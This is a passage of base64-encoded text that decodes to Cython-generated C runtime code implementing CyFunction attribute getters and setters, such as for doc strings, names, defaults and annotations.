3Rpb25fQ2hlY2soZnVuYykgJiYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaikge1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoXG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZiksXG4gICAgICAgICAgICAoKGNsYXNzb2JqKSA/IF9fUHl4X05ld1JlZihjbGFzc29iaikgOiBOVUxMKSk7XG4jZWxzZVxuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKFxuICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAoZikpLT5tbV9jbGFzcyxcbiAgICAgICAgKFB5VHlwZU9iamVjdCopKChjbGFzc29iaikgPyBfX1B5eF9OZXdSZWYoY2xhc3NvYmopIDogTlVMTCkpO1xuI2VuZGlmXG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcClcbntcbiAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBvcC0+ZnVuY19kb2MgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19kb2NfXyIpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jX2RvYykpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgaWYgKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfZG9jKSB7XG4gICAgICAgICAgICBvcC0+ZnVuY19kb2MgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX2RvYyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKVxuICAgICAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpO1xuICAgICAgICAgICAgcmV0dXJuIFB5X05vbmU7XG4gICAgICAgIH1cbiNlbmRpZlxuICAgIH1cbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZG9jKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfZG9jO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY2xvc3VyZSkge1xuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY2xvc3VyZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHZhbHVlID09IE5VTEwpIHtcbiAgICAgICAgdmFsdWUgPSBQeV9Ob25lO1xuICAgIH1cbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2RvYywgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZV9sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIG9wLT5mdW5jX25hbWUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKG9wLT5mdW5jLCAiX19uYW1lX18iKTtcbiNlbHNlXG4gICAgICAgIG9wLT5mdW5jX25hbWUgPSBQeVVuaWNvZGVfSW50ZXJuRnJvbVN0cmluZygoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX25hbWUpO1xuI2VuZGlmXG4gICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19uYW1lKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfbmFtZTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19uYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19uYW1lLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19xdWFsbmFtZSk7XG4gICAgcmVzdWx0ID0gb3AtPmZ1bmNfcXVhbG5hbWU7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0ICp2YWx1ZSwgdm9pZCAqY29udGV4dClcbntcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAodW5saWtlbHkodmFsdWUgPT0gTlVMTCB8fCAhUHlVbmljb2RlX0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19xdWFsbmFtZSwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdF9sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpIHtcbiAgICAgICAgb3AtPmZ1bmNfZGljdCA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RpY3QpO1xuICAgIHJldHVybiBvcC0+ZnVuY19kaWN0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGljdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgImZ1bmN0aW9uXCdzIGRpY3Rpb25hcnkgbWF5IG5vdCBiZSBkZWxldGVkIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgInNldHRpbmcgZnVuY3Rpb25cJ3MgZGljdGlvbmFyeSB0byBhIG5vbi1kaWN0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kaWN0LCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfZ2xvYmFscztcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKG9wKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeV9JTkNSRUYoUHlfTm9uZSk7XG4gICAgcmV0dXJuIFB5X05vbmU7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gKG9wLT5mdW5jX2NvZGUpID8gb3AtPmZ1bmNfY29kZSA6IFB5X05vbmU7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIGludCByZXN1bHQgPSAwO1xuICAgIFB5T2JqZWN0ICpyZXMgPSBvcC0+ZGVmYXVsdHNfZ2V0dGVyKChQeU9iamVjdCAqKSBvcCk7XG4gICAgaWYgKHVubGlrZWx5KCFyZXMpKVxuICAgICAgICByZXR1cm4gLTE7XG4gICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gUHlUdXBsZV9HRVRfSVRFTShyZXMsIDApO1xuICAgIFB5X0lOQ1JFRihvcC0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMSk7XG4gICAgUHlfSU5DUkVGKG9wLT5kZWZhdWx0c19rd2RpY3QpO1xuICAgICNlbHNlXG4gICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMCk7XG4gICAgaWYgKHVubGlrZWx5KCFvcC0+ZGVmYXVsdHNfdHVwbGUpKSByZXN1bHQgPSAtMTtcbiAgICBlbHNlIHtcbiAgICAgICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShyZXMsIDEpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c19rd2RpY3QpKSByZXN1bHQgPSAtMTtcbiAgICB9XG4gICAgI2VuZGlmXG4gICAgUHlfREVDUkVGKHJlcyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAoIXZhbHVlKSB7XG4gICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5VHVwbGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIHR1cGxlIG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX1dhcm5FeChQeUV4Y19SdW50aW1lV2FybmluZywgImNoYW5nZXMgdG8gY3lmdW5jdGlvbi5fX2RlZmF1bHRzX18gd2lsbCBub3QgIlxuICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTtcbiAgICBQeV9JTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c190dXBsZSwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgaWYgKG9wLT5kZWZhdWx0c19nZXR0ZXIpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX3R1cGxlO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdCA9IE5VTEw7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKG9wKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgaW50XG5fX1B5eF9DeUZ1bmN0aW9uX3NldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBpZiAoIXZhbHVlKSB7XG4gICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19rd2RlZmF1bHRzX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5RXJyX1dhcm5FeChQeUV4Y19SdW50aW1lV2FybmluZywgImNoYW5nZXMgdG8gY3lmdW5jdGlvbi5fX2t3ZGVmYXVsdHNfXyB3aWxsIG5vdCAiXG4gICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpO1xuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX2t3ZGljdCwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0c19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDtcbiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHtcbiAgICAgICAgaWYgKG9wLT5kZWZhdWx0c19nZXR0ZXIpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJlc3VsdCA9IFB5X05vbmU7XG4gICAgICAgIH1cbiAgICB9XG4gICAgUHlfSU5DUkVGKHJlc3VsdCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7XG4gICAgUHlPYmplY3QqIHJlc3VsdDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICghdmFsdWUgfHwgdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICB2YWx1ZSA9IE5VTEw7XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseSghUHlEaWN0X0NoZWNrKHZhbHVlKSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJfX2Fubm90YXRpb25zX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5X1hJTkNSRUYodmFsdWUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2Fubm90YXRpb25zLCB2YWx1ZSk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9uc19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHtcbiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmZ1bmNfYW5ub3RhdGlvbnM7XG4gICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7XG4gICAgICAgIHJlc3VsdCA9IFB5RGljdF9OZXcoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSByZXR1cm4gTlVMTDtcbiAgICAgICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSByZXN1bHQ7XG4gICAgfVxuICAgIFB5X0lOQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Fubm90YXRpb25zX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZV92YWx1ZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkge1xuICAgIGludCBpc19jb3JvdXRpbmUgPSBvcC0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORTtcbiAgICBpZiAoaXNfY29yb3V0aW5lKSB7XG4gICAgICAgIFB5T2JqZWN0ICppc19jb3JvdXRpbmVfdmFsdWUsICptb2R1bGUsICpmcm9tbGlzdCwgKm1hcmtlciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc19jb3JvdXRpbmU7XG4gICAgICAgIGZyb21saXN0ID0gUHlMaXN0X05ldygxKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmcm9tbGlzdCkpIHJldHVybiBOVUxMO1xuICAgICAgICBQeV9JTkNSRUYobWFya2VyKTtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgICAgIFB5TGlzdF9TRVRfSVRFTShmcm9tbGlzdCwgMCwgbWFya2VyKTtcbiNlbHNlXG4gICAgICAgIGlmICh1bmxpa2VseShQeUxpc3RfU2V0SXRlbShmcm9tbGlzdCwgMCwgbWFya2VyKSA8IDApKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYobWFya2VyKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihmcm9tbGlzdCk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuI2VuZGlmXG4gICAgICAgIG1vZHVsZSA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZUxldmVsT2JqZWN0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hc3luY2lvX2Nvcm91dGluZXMsIE5VTEwsIE5VTEwsIGZyb21saXN0LCAwKTtcbiAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtb2R1bGUpKSBnb3RvIGlnbm9yZTtcbiAgICAgICAgaXNfY29yb3V0aW5lX3ZhbHVlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihtb2R1bGUsIG1hcmtlcik7XG4gICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpO1xuICAgICAgICBpZiAobGlrZWx5KGlzX2Nvcm91dGluZV92YWx1ZSkpIHtcbiAgICAgICAgICAgIHJldHVybiBpc19jb3JvdXRpbmVfdmFsdWU7XG4gICAgICAgIH1cbmlnbm9yZTpcbiAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1B5Q